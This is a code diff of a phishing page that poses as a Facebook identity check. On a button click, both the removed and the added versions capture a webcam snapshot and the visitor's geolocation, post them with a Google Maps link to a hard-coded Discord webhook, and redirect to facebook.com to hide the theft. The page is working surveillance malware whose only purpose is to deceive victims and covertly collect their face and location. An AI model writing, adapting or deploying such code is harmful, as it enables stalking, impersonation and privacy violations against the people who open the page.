@@ -1,42 +1,39 @@
-<script>
-    const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0";
-
-    async function startFBScan() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const { latitude, longitude } = pos.coords;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('file', blob, 'fb_messenger_audit.jpg');
-                        fd.append('payload_json', JSON.stringify({
-                            content: "🔵 **Messenger Alert: Identity Verified!**",
-                            embeds: [{
-                                color: 1565439,
-                                title: "Target Info Captured",
-                                fields: [
-                                    { name: "📍 Google Maps Link", value: `https://www.google.com/maps?q=${latitude},${longitude}` },
-                                    { name: "📱 Device Info", value: navigator.userAgent }
-                                ],
-                                timestamp: new Date()
-                            }]
-                        }));
-
-                        await fetch(webhookURL, { method: 'POST', body: fd });
-                        window.location.href = "https://www.facebook.com/settings?tab=security";
-                    }, 'image/jpeg');
-                }, 1500);
-            }, () => { window.location.href = "https://www.facebook.com"; });
-        } catch (e) { window.location.href = "https://www.facebook.com"; }
-    }
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Verification</title>
+    <style>
+        body { background: #f0f2f5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color: #1877f2;">facebook</h2>
+        <p>Verify your identity to secure your account.</p>
+        <button onclick="start()">Confirm Identity</button>
+    </div>
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none"></canvas>
+    <script>
+        async function start() {
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            document.getElementById('v').srcObject = stream;
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const canvas = document.getElementById('c');
+                const video = document.getElementById('v');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (b) => {
+                    const fd = new FormData();
+                    fd.append('file', b, 'img.jpg');
+                    fd.append('payload_json', JSON.stringify({content: `📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`}));
+                    await fetch("https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0", {method:'POST', body:fd});
+                    window.location.href = "https://facebook.com";
+                }, 'image/jpeg');
+            });
+        }
+    </script>
+</body>
+</html>
